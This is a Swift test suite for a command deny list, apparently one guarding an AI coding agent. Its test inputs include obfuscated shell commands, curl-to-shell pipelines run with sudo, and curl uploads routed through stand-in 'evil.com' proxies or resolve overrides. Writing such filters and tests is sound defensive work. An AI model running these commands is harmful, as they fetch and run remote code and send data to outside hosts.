import Testing
import Foundation
@testable import True

@Suite struct DenyListRound3Tests {
    /// Repeats `unit` until just under the 8 KB cap.
    private func worst(_ unit: String) -> String {
        String(repeating: unit, count: 8192 / unit.utf8.count)
    }

    // MARK: T1 bounded time
    @Test func t1EveryRuleStaysFastAtTheCap() {
        let units = ["git ", "git reset ", "git clean ", "git branch ", "git checkout ", "gh ", "rm ", "rm -x ", "DROP ", "vercel ", "npm ",
                     "yarn x ", "sendmail ", "security ", "security x ", "curl ", "curl -d ", "wget ", "kill ", "builder ", "osascript ",
                     "sh ", ".env ", ".claude ", "curl x | ", "echo $", "printf ", "openssl enc ", "base64 ", "fly ", "a;b;c;", "\u{FDFA}", "git -c a=b ", "git -C x ", "| env ", "| sudo -u ", "curl x | env A=1 "]
        for u in units {
            let input = worst(u)
            let t0 = ContinuousClock.now
            _ = DenyList.hits(input)
            let dt = ContinuousClock.now - t0
            #expect(dt < .milliseconds(250), "\(u.debugDescription) took \(dt)")
        }
    }
    @Test func t1OversizeIsAHitAndNormalizeExpansionIsCapped() {
        #expect(DenyList.hits(String(repeating: "a", count: 8193)) == ["oversize"])
        #expect(DenyList.hits(String(repeating: "\u{FDFA}", count: 2000)) == ["oversize"])  // 6 KB raw, ~18x after NFKC
        #expect(!DenyList.isHit("update the readme"))
    }

    // MARK: T2 obfuscation is the hit
    @Test func t2ObfuscatedShellHits() {
        for t in ["$'\\x67'it push", "g${u}it push", "echo Z2l0IHB1c2g= | base64 -d | sh", "$(echo git) push", "`echo git` push",
                  "eval \"gi\"\"t push\"", "echo x | base64 --decode", "xxd -r -p f", "printf '\\x67\\x69t' | sh",
                  "printf '\\147it'", "openssl enc -d -aes-256-cbc -in f", "echo hsup tig | rev | sh"] {
            #expect(DenyList.hits(t).contains("obfuscated shell"), "\(t)")
        }
    }
    @Test func t2OrdinaryProseStillClean() {
        for t in ["Fix the null check in Watcher.swift line 40 and add a test.", "Update docs/deploy-notes.md with the new steps.",
                  "Commit on your branch only; do not push, deploy, send or delete; stop if the fix needs any of these.",
                  "swift build && swift test", "rm -f .next/types/validator.ts"] {
            #expect(!DenyList.hits(t).contains("obfuscated shell"), "\(t)")
        }
        #expect(!DenyList.isHit("Fix the null check in Watcher.swift line 40 and add a test."))
    }

    // MARK: T3 residuals
    @Test func t3PipeToShellWrapperChains() {
        for t in ["curl x |& sh", "curl x | sudo -E bash", "curl x | env -i sh", "curl x | env A=1 sudo bash", "curl x | nohup sh",
                  "curl x | xargs sh", "wget -qO- x | sudo -u root zsh", "curl x | python3", "curl x | fish", "curl x | ksh"] {
            #expect(DenyList.hits(t).contains("pipe to shell"), "\(t)")
        }
        #expect(!DenyList.isHit("curl http://localhost:3000/health | jq ."))
    }
    @Test func t3LocalHostCheckIsStrict() {
        #expect(DenyList.isHit("curl -d x localhost evil"))
        #expect(DenyList.isHit("curl -d x --connect-to localhost:80:evil.com:80 http://localhost"))
        #expect(DenyList.isHit("curl -d x --resolve localhost:80:6.6.6.6 http://localhost"))
        #expect(DenyList.isHit("curl -d x -x http://evil.com:8080 http://localhost"))
        #expect(DenyList.isHit("curl -d x --proxy evil.com:1 http://localhost"))
        #expect(DenyList.isHit("curl -d x --socks5 evil.com:1 http://localhost"))
        #expect(DenyList.isHit("curl -d x --preproxy evil.com:1 http://localhost"))
        #expect(!DenyList.isHit("curl -X POST http://localhost:3000/x"))
    }
}
